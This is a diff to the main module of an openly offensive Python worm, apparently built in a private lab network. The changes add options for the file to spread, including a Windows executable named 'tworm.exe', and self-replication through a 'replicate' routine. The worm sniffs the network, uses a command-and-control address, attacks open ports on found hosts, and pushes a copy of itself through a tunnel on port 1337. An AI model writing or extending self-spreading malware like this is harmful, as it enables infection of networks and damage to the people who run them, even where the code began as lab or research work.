@@ -7,7 +7,15 @@ from replicate import replicate
 
 
 def main():
-    clone()
+    if len(sys.argv) > 2:
+        if sys.argv[1] == "--path":
+            file_path = sys.argv[2]
+        elif sys.argv[1] == "--attack" and sys.argv[2] == "windows":
+            file_path = "tworm.exe"
+    else:
+        file_path = sys.argv[0]
+    clone(file_path)
+    
     c2_server = "192.168.56.108"
     not_testing_targets = ["192.168.56.1", "192.168.56.100", "192.168.56.108"]
     network = sniff()
@@ -26,7 +34,8 @@ def main():
                             #local_ip = "0.0.0.0"
                             print("attacking port{}".format(running_port))
                             listening_port = 1337
-                            tunnel = comm.tunnel(local_ip, listening_port)
+                            worm = replicate(file_path)
+                            tunnel = comm.tunnel(worm,local_ip, listening_port)
                             tunnel.start()
                             
                             time.sleep(2)
@@ -36,12 +45,13 @@ def main():
                             infection.join()
                             tunnel.join()
                             
-                            #tunnel.close_client_connection(target_ip.address)
+                            tunnel.close_client_connection(target_ip.address)
 
-def clone():
+def clone(file_path):
     try:
-        self_clone = replicate(sys.argv[0], full_path=os.getcwd())
-        self_clone.self_replicate(platform.system(),sys.argv[0])
+        fullpath=os.getcwd()
+        self_clone = replicate(file_path, fullpath)
+        self_clone.self_replicate(platform.system(),file_path)
     except Exception as e:
         print("Clone Error: {}".format(e))
         
